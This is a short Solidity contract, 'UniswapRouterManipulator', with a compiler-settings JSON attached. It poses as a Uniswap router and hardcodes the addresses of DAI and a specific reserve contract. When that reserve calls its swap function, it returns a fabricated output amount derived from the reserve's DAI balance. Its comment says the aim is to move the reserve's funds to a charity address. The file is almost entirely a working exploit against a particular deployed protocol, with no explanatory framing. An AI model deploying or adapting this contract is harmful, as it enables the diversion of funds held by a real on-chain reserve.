pragma solidity ^0.8.0;

interface I_ERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract UniswapRouterManipulator {

    event UniswapRouterManipulated();

    bool public manipulated;
    address public dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address public reserve = 0x390a8Fb3fCFF0bB0fCf1F91c7E36db9c53165d17;
    // Hardcoded data pulled from current reserve (can verify on etherscan)
    uint256 public PRECISION = 10**18;
    uint256 public charityCut = 100000000000000000;
	uint256 public rewardsCut = 100000000000000000;
    
	constructor() public {}

	function swapExactTokensForTokens(
		uint amountIn,
		uint amountOutMin,
		address[] calldata path,
		address to,
		uint deadline
	) external returns (uint256[] memory amounts) {
        require(msg.sender == reserve, "swapExactTokensForTokens: !reserve");
		require(!manipulated, "swapExactTokensForTokens: manipulated");

        amounts = new uint256[](2);
        amounts[0] = 0;
        
        // move oldReserveBalance to charity by reversing the code that computes the charityCutAmount
        uint256 oldReserveBalance = I_ERC20(dai).balanceOf(reserve);
        amounts[1] = oldReserveBalance * (PRECISION - rewardsCut) / charityCut;

        manipulated = true;
        emit UniswapRouterManipulated();
	}
}

{
  "optimizer": {
    "enabled": false,
    "runs": 200
  },
  "outputSelection": {
    "*": {
      "*": [
        "evm.bytecode",
        "evm.deployedBytecode",
        "abi"
      ]
    }
  },
  "libraries": {}
}